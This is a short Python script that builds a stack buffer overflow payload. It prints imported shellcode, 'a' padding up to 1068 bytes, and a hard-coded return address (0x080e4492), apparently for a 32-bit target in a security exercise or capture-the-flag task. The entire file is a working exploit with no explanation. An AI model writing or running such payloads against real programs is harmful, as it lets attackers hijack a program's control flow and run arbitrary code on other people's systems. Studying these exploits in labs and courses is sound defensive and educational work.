import sys
from shellcode import shellcode

b = b'a' * (1068-len(shellcode)) + b'\x92'+b'\x44'+b'\x0e'+b'\x08' 

sys.stdout.buffer.write(shellcode+b)
